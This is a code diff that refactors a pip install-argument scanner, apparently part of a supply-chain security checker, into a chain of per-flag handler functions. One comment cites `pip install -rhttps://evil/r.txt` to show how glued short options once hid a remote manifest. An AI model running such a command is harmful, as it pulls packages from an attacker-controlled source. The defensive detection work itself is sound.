@@ -77,7 +77,22 @@ function scanPipFlags(args: string[]): PipFlagScan {
 // effect. Returns the count of ADDITIONAL tokens consumed beyond `args[i]`
 // itself (0 or 1) — same semantics as the original inline `i++`ing loop body,
 // relocated here so the caller's `for` stays a single unbranched statement.
-function consumePipToken(args: string[], i: number, scan: PipFlagScan): number {
+type PipTokenHandler = (
+	args: string[],
+	i: number,
+	scan: PipFlagScan,
+) => number | undefined;
+
+// Each handler below returns `undefined` when the token at `args[i]` isn't its
+// kind of flag, letting `consumePipToken` try the next handler in sequence.
+// Order matches the original inline if-chain exactly (index-url, requirement,
+// constraint, editable, glued short-option), so behavior is unchanged.
+
+function consumePipIndexUrlToken(
+	args: string[],
+	i: number,
+	scan: PipFlagScan,
+): number | undefined {
 	const a = nonNull(args[i]);
 	if (a === "--index-url" || a === "-i" || a === "--extra-index-url") {
 		scan.customRegistry = args[i + 1];
@@ -88,6 +103,15 @@ function consumePipToken(args: string[], i: number, scan: PipFlagScan): number {
 		scan.customRegistry = m[1];
 		return 0;
 	}
+	return undefined;
+}
+
+function consumePipRequirementToken(
+	args: string[],
+	i: number,
+	scan: PipFlagScan,
+): number | undefined {
+	const a = nonNull(args[i]);
 	if (a === "-r" || a === "--requirement") {
 		scan.manifestFile = args[i + 1];
 		return 1;
@@ -97,10 +121,28 @@ function consumePipToken(args: string[], i: number, scan: PipFlagScan): number {
 		scan.manifestFile = mr[1];
 		return 0;
 	}
+	return undefined;
+}
+
+function consumePipConstraintToken(
+	args: string[],
+	i: number,
+	scan: PipFlagScan,
+): number | undefined {
+	const a = nonNull(args[i]);
 	if (a === "-c" || a === "--constraint") {
 		scan.fromConstraints = true;
 		return 1;
 	}
+	return undefined;
+}
+
+function consumePipEditableToken(
+	args: string[],
+	i: number,
+	scan: PipFlagScan,
+): number | undefined {
+	const a = nonNull(args[i]);
 	if (scanPipEditable(a, args[i + 1], scan.positionals)) {
 		return 1;
 	}
@@ -109,20 +151,44 @@ function consumePipToken(args: string[], i: number, scan: PipFlagScan): number {
 		scan.positionals.push(nonNull(meq[1]));
 		return 0;
 	}
-	// ATTACHED short-option values — optparse-style pip accepts the value glued
-	// to the flag: `-rreqs.txt`, `-ihttps://mirror`, `-cconstraints.txt`,
-	// `-egit+URL`. Without this branch each parsed as an unknown flag and was
-	// silently skipped, so `pip install -rhttps://evil/r.txt` looked like a
-	// bare manifest sync and the manifest/registry/editable signals were lost —
-	// the same attached-value class as the git `-mfix` finding (2026-06).
+	return undefined;
+}
+
+// ATTACHED short-option values — optparse-style pip accepts the value glued
+// to the flag: `-rreqs.txt`, `-ihttps://mirror`, `-cconstraints.txt`,
+// `-egit+URL`. Without this branch each parsed as an unknown flag and was
+// silently skipped, so `pip install -rhttps://evil/r.txt` looked like a
+// bare manifest sync and the manifest/registry/editable signals were lost —
+// the same attached-value class as the git `-mfix` finding (2026-06).
+function consumePipGluedToken(
+	args: string[],
+	i: number,
+	scan: PipFlagScan,
+): number | undefined {
+	const a = nonNull(args[i]);
 	const glued = a.match(/^-([rice])(.+)$/);
-	if (glued) {
-		const value = glued[2] ?? "";
-		if (glued[1] === "r") scan.manifestFile = value;
-		else if (glued[1] === "i") scan.customRegistry = value;
-		else if (glued[1] === "c") scan.fromConstraints = true;
-		else scan.positionals.push(value); // -e<spec>: the value IS the install spec
-		return 0;
+	if (!glued) return undefined;
+	const value = glued[2] ?? "";
+	if (glued[1] === "r") scan.manifestFile = value;
+	else if (glued[1] === "i") scan.customRegistry = value;
+	else if (glued[1] === "c") scan.fromConstraints = true;
+	else scan.positionals.push(value); // -e<spec>: the value IS the install spec
+	return 0;
+}
+
+const PIP_TOKEN_HANDLERS: PipTokenHandler[] = [
+	consumePipIndexUrlToken,
+	consumePipRequirementToken,
+	consumePipConstraintToken,
+	consumePipEditableToken,
+	consumePipGluedToken,
+];
+
+function consumePipToken(args: string[], i: number, scan: PipFlagScan): number {
+	const a = nonNull(args[i]);
+	for (const handler of PIP_TOKEN_HANDLERS) {
+		const consumed = handler(args, i, scan);
+		if (consumed !== undefined) return consumed;
 	}
 	if (a.startsWith("-")) {
 		return pipFlagConsumesValue(a, args[i + 1]) ? 1 : 0;
